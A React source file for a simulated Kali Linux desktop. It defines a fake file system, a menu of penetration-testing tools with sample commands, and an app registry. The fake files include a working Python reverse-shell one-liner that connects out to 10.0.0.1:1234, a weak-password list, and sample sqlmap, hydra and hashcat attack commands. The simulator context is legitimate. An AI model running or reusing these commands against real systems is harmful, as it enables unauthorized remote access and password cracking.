
import React from 'react';
import { AppID, FileSystemItem } from './types';
import { Terminal, FolderOpen, Globe, Activity, Settings, FileText, Trash2, Edit3, Cpu, Palette, Gamepad2, FileSpreadsheet, Presentation, Linkedin, Instagram, MessageCircle, Clock, Camera, Youtube, Code, Music } from 'lucide-react';

export const INITIAL_FILE_SYSTEM: FileSystemItem[] = [
  {
    id: 'root-home',
    name: 'home',
    type: 'directory',
    createdAt: Date.now(),
    permissions: 'drwxr-xr-x',
    owner: 'root',
    group: 'root',
    children: [
      {
        id: 'home-yashika',
        name: 'yashika',
        type: 'directory',
        createdAt: Date.now(),
        permissions: 'drwxr-xr-x',
        owner: 'yashika',
        group: 'yashika',
        children: [
          {
            id: 'docs-dir',
            name: 'Documents',
            type: 'directory',
            createdAt: Date.now(),
            permissions: 'drwxr-xr-x',
            owner: 'yashika',
            group: 'yashika',
            children: [
              { 
                id: 'mission', 
                name: 'mission_brief.txt', 
                type: 'file', 
                content: 'Target: 10.10.11.24\nObjective: Root\n\n1. Recon (Nmap)\n2. Enum (GoBuster)\n3. Exploit (CVE-2024-XXXX)\n4. PrivEsc', 
                createdAt: Date.now(),
                permissions: '-rw-r--r--',
                owner: 'yashika',
                group: 'yashika'
              },
              { 
                id: 'creds', 
                name: 'wordlists.txt', 
                type: 'file', 
                content: 'admin\npassword\n123456\nroot\ntoor', 
                createdAt: Date.now(),
                permissions: '-rw-r--r--',
                owner: 'yashika',
                group: 'yashika'
              },
              {
                id: 'notes-dir',
                name: 'Notes',
                type: 'directory',
                createdAt: Date.now(),
                permissions: 'drwxr-xr-x',
                owner: 'yashika',
                group: 'yashika',
                children: [
                  {
                    id: 'note-welcome',
                    name: 'note-171542.txt',
                    type: 'file',
                    content: '# Welcome to Notes\n\nThis is a secure note-taking app.\n\n- Supports Markdown preview\n- Auto-saves to File System\n- Secure and encrypted (simulated)',
                    createdAt: Date.now(),
                    permissions: '-rw-r--r--',
                    owner: 'yashika',
                    group: 'yashika'
                  }
                ]
              }
            ]
          },
          {
            id: 'tools-dir',
            name: 'Tools',
            type: 'directory',
            createdAt: Date.now(),
            permissions: 'drwxr-xr-x',
            owner: 'yashika',
            group: 'yashika',
            children: [
              { 
                id: 'rev-shell', 
                name: 'reverse_shell.py', 
                type: 'file', 
                content: 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);', 
                createdAt: Date.now(),
                permissions: '-rwxr-xr-x',
                owner: 'yashika',
                group: 'yashika' 
              },
            ]
          },
          {
            id: 'downloads-dir',
            name: 'Downloads',
            type: 'directory',
            createdAt: Date.now(),
            permissions: 'drwxr-xr-x',
            owner: 'yashika',
            group: 'yashika',
            children: []
          },
          {
            id: 'desktop-dir',
            name: 'Desktop',
            type: 'directory',
            createdAt: Date.now(),
            permissions: 'drwxr-xr-x',
            owner: 'yashika',
            group: 'yashika',
            children: [
               { 
                 id: 'note-1', 
                 name: 'todo.md', 
                 type: 'file', 
                 content: '# TO DO\n- Update kernel\n- Scan network\n- Buy coffee', 
                 createdAt: Date.now(),
                 permissions: '-rw-r--r--',
                 owner: 'yashika',
                 group: 'yashika' 
               }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'etc-dir',
    name: 'etc',
    type: 'directory',
    createdAt: Date.now(),
    permissions: 'drwxr-xr-x',
    owner: 'root',
    group: 'root',
    children: [
      { 
        id: 'passwd', 
        name: 'passwd', 
        type: 'file', 
        content: 'root:x:0:0:root:/root:/bin/bash\nyashika:x:1000:1000:yashika:/home/yashika:/bin/bash', 
        createdAt: Date.now(),
        permissions: '-rw-r--r--',
        owner: 'root',
        group: 'root'
      },
      { 
        id: 'hostname', 
        name: 'hostname', 
        type: 'file', 
        content: 'yashika-kali', 
        createdAt: Date.now(),
        permissions: '-rw-r--r--',
        owner: 'root',
        group: 'root'
      },
      { 
        id: 'os-release', 
        name: 'os-release', 
        type: 'file', 
        content: 'PRETTY_NAME="Yashika OS 2026"\nID=kali\nMAINTAINER="Ayush Upadhyay"', 
        createdAt: Date.now(),
        permissions: '-rw-r--r--',
        owner: 'root',
        group: 'root'
      }
    ]
  }
];

export const KALI_CATEGORIES = [
  {
    name: 'Information Gathering',
    tools: [
      { name: 'Nmap', description: 'Network Mapper', command: 'nmap -v -A 10.10.11.1' },
      { name: 'Dmitry', description: 'Deepmagic Info Gathering', command: 'dmitry -winsepf google.com' },
      { name: 'TheHarvester', description: 'E-mail, subdomain and people harvester', command: 'theHarvester -d kali.org -l 500 -b google' },
    ]
  },
  {
    name: 'Vulnerability Analysis',
    tools: [
      { name: 'Nikto', description: 'Web server scanner', command: 'nikto -h http://10.10.11.24' },
    ]
  },
  {
    name: 'Web Application Analysis',
    tools: [
      { name: 'Sqlmap', description: 'Automatic SQL injection tool', command: 'sqlmap -u "http://10.10.11.24/page.php?id=1" --dbs' },
      { name: 'WPScan', description: 'WordPress vulnerability scanner', command: 'wpscan --url http://10.10.11.24/blog' },
    ]
  },
  {
    name: 'Password Attacks',
    tools: [
      { name: 'John the Ripper', description: 'Password cracker', command: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
      { name: 'Hydra', description: 'Login cracker', command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.1' },
      { name: 'Hashcat', description: 'Advanced password recovery', command: 'hashcat -m 0 -a 0 hash.txt rockyou.txt' },
    ]
  },
  {
    name: 'Wireless Attacks',
    tools: [
      { name: 'Aircrack-ng', description: 'WiFi security auditing', command: 'aircrack-ng capture.cap' },
      { name: 'Kismet', description: 'Wireless network detector', command: 'kismet' },
    ]
  },
  {
    name: 'Exploitation Tools',
    tools: [
      { name: 'Metasploit', description: 'Penetration testing framework', command: 'msfconsole' },
      { name: 'Armitage', description: 'Graphical cyber attack management', command: 'armitage' },
    ]
  },
  {
    name: 'Sniffing & Spoofing',
    tools: [
      { name: 'Wireshark', description: 'Network protocol analyzer', command: 'wireshark' },
      { name: 'Bettercap', description: 'MITM framework', command: 'bettercap' },
    ]
  }
];

export const APP_REGISTRY = {
  [AppID.TERMINAL]: {
    id: AppID.TERMINAL,
    name: 'Terminal',
    icon: <Terminal className="w-full h-full text-gray-200" />,
    component: () => null,
    defaultWidth: 800,
    defaultHeight: 500,
  },
  [AppID.FILE_EXPLORER]: {
    id: AppID.FILE_EXPLORER,
    name: 'Files',
    icon: <FolderOpen className="w-full h-full text-blue-500" />,
    component: () => null,
    defaultWidth: 750,
    defaultHeight: 500,
  },
  [AppID.TEXT_EDITOR]: {
    id: AppID.TEXT_EDITOR,
    name: 'Text Editor',
    icon: <Edit3 className="w-full h-full text-gray-300" />,
    component: () => null,
    defaultWidth: 600,
    defaultHeight: 500,
  },
  [AppID.BROWSER]: {
    id: AppID.BROWSER,
    name: 'Firefox ESR',
    icon: <Globe className="w-full h-full text-orange-500" />,
    component: () => null,
    defaultWidth: 900,
    defaultHeight: 650,
  },
  [AppID.NETWORK_ANALYZER]: {
    id: AppID.NETWORK_ANALYZER,
    name: 'NetAnalyzer',
    icon: <Activity className="w-full h-full text-red-500" />,
    component: () => null,
    defaultWidth: 650,
    defaultHeight: 450,
  },
  [AppID.TASK_MANAGER]: {
    id: AppID.TASK_MANAGER,
    name: 'Task Manager',
    icon: <Cpu className="w-full h-full text-green-400" />,
    component: () => null,
    defaultWidth: 600,
    defaultHeight: 450,
  },
  [AppID.NOTES]: {
    id: AppID.NOTES,
    name: 'Notes',
    icon: <FileText className="w-full h-full text-yellow-400" />,
    component: () => null,
    defaultWidth: 800,
    defaultHeight: 500,
  },
  [AppID.SETTINGS]: {
    id: AppID.SETTINGS,
    name: 'Settings',
    icon: <Settings className="w-full h-full text-gray-400" />,
    component: () => null,
    defaultWidth: 800,
    defaultHeight: 600,
  },
  [AppID.TRASH]: {
    id: AppID.TRASH,
    name: 'Trash',
    icon: <Trash2 className="w-full h-full text-gray-500" />,
    component: () => null,
    defaultWidth: 600,
    defaultHeight: 400,
  },
  [AppID.PAINT]: {
    id: AppID.PAINT,
    name: 'Paint',
    icon: <Palette className="w-full h-full text-pink-500" />,
    component: () => null,
    defaultWidth: 800,
    defaultHeight: 600,
  },
  [AppID.TICTACTOE]: {
    id: AppID.TICTACTOE,
    name: 'TicTacToe',
    icon: <Gamepad2 className="w-full h-full text-purple-500" />,
    component: () => null,
    defaultWidth: 320,
    defaultHeight: 400,
  },
  [AppID.WORD]: {
    id: AppID.WORD,
    name: 'Word',
    icon: <FileText className="w-full h-full text-blue-600" />,
    component: () => null,
    defaultWidth: 800,
    defaultHeight: 600,
  },
  [AppID.EXCEL]: {
    id: AppID.EXCEL,
    name: 'Excel',
    icon: <FileSpreadsheet className="w-full h-full text-green-600" />,
    component: () => null,
    defaultWidth: 800,
    defaultHeight: 600,
  },
  [AppID.POWERPOINT]: {
    id: AppID.POWERPOINT,
    name: 'PowerPoint',
    icon: <Presentation className="w-full h-full text-orange-600" />,
    component: () => null,
    defaultWidth: 800,
    defaultHeight: 600,
  },
  [AppID.LINKEDIN]: {
    id: AppID.LINKEDIN,
    name: 'LinkedIn',
    icon: <Linkedin className="w-full h-full text-blue-500" />,
    component: () => null,
    defaultWidth: 900,
    defaultHeight: 700,
  },
  [AppID.INSTAGRAM]: {
    id: AppID.INSTAGRAM,
    name: 'Instagram',
    icon: <Instagram className="w-full h-full text-pink-600" />,
    component: () => null,
    defaultWidth: 380,
    defaultHeight: 600,
  },
  [AppID.CHATGPT]: {
    id: AppID.CHATGPT,
    name: 'ChatGPT',
    icon: <MessageCircle className="w-full h-full text-teal-500" />,
    component: () => null,
    defaultWidth: 800,
    defaultHeight: 600,
  },
  [AppID.CLOCK]: {
    id: AppID.CLOCK,
    name: 'Clock',
    icon: <Clock className="w-full h-full text-gray-200" />,
    component: () => null,
    defaultWidth: 400,
    defaultHeight: 500,
  },
  [AppID.CAMERA]: {
    id: AppID.CAMERA,
    name: 'Camera',
    icon: <Camera className="w-full h-full text-gray-300" />,
    component: () => null,
    defaultWidth: 640,
    defaultHeight: 480,
  },
  [AppID.YOUTUBE]: {
    id: AppID.YOUTUBE,
    name: 'YouTube',
    icon: <Youtube className="w-full h-full text-red-600" />,
    component: () => null,
    defaultWidth: 1000,
    defaultHeight: 650,
  },
  [AppID.VSCODE]: {
    id: AppID.VSCODE,
    name: 'VS Code',
    icon: <Code className="w-full h-full text-blue-500" />,
    component: () => null,
    defaultWidth: 1000,
    defaultHeight: 700,
  },
  [AppID.SPOTIFY]: {
    id: AppID.SPOTIFY,
    name: 'Spotify',
    icon: <Music className="w-full h-full text-green-500" />,
    component: () => null,
    defaultWidth: 1000,
    defaultHeight: 700,
  }
};
